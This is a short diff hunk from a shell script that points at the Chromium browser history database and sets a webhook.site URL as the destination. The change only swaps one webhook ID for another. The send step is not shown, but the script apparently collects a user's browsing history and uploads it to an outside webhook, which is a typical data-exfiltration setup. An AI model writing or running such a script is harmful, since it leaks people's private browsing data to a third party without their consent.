@@ -4,7 +4,7 @@
 DATABASE="$HOME/.config/chromium/Default/History"
 
 # Webhook URL
-WEBHOOK_URL="https://webhook.site/25e98ba9-7c25-49d0-b162-47a697d946b0" # Replace with your webhook URL
+WEBHOOK_URL="https://webhook.site/7ae8dde8-6119-4c08-b515-bbc3b74e8814" # Replace with your webhook URL
 
 # Check if sqlite3 is installed
 if ! command -v sqlite3 &> /dev/null; then
